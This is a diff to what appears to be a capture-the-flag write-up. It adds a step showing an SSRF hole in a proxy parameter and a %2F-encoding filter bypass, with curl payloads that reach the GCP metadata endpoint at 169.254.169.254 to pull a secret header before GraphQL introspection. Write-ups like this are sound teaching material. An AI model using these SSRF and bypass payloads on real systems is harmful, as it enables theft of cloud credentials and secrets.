@@ -24,7 +24,24 @@ This was not your typical GraphQL challenge, it chained together multiple real-w
 
 ## 🧾 Step-by-Step Breakdown
 
-### ✨ 1. SSRF to Access GCP Metadata
+### 🕵️‍♀️ 1. Discovering the SSRF Vector
+
+While exploring the application, I noticed that the `/proxy?url=` parameter accepted user-supplied input. Attempting a standard SSRF payload like:
+
+```bash
+curl "http://34.86.186.68:8080/proxy?url=http://169.254.169.254/"
+```
+
+...was blocked or sanitized. However, encoding the slashes (/) using %2F bypassed the filter:
+
+```bash
+curl "http://34.86.186.68:8080/proxy?url=http:%2F%2F169.254.169.254%2F"
+```
+
+This subtle bypass allowed full interaction with internal GCP services, including metadata enumeration.
+--
+
+### ✨ 2. SSRF to Access GCP Metadata
 
 Used the vulnerable proxy endpoint to access the internal GCP metadata service:
 
@@ -35,7 +52,7 @@ curl "http://34.86.186.68:8080/proxy?url=http:%2F%2F169.254.169.254%2FcomputeMet
 This revealed the internal attribute: *X-JJ-SECRET*
 --
 
-### 🔑 2. Extracting the Secret Header
+### 🔑 3. Extracting the Secret Header
 
 Then I pulled the value of that attribute directly:
 
@@ -46,7 +63,7 @@ curl "http://34.86.186.68:8080/proxy?url=http:%2F%2F169.254.169.254%2FcomputeMet
 ✅ Output: *S3NT1N3L*
 --
 
-### 🧩 3. GraphQL Introspection
+### 🧩 4. GraphQL Introspection
 
 Armed with the secret, I could now access the protected GraphQL endpoint:
 
@@ -59,7 +76,7 @@ curl http://34.86.186.68:8080/graphql \
 This revealed a hidden mutation: *m309e5336*
 --
 
-### 🚨 4. Invoking the Mutation
+### 🚨 5. Invoking the Mutation
 
 I triggered the hidden mutation to retrieve the flag:
 
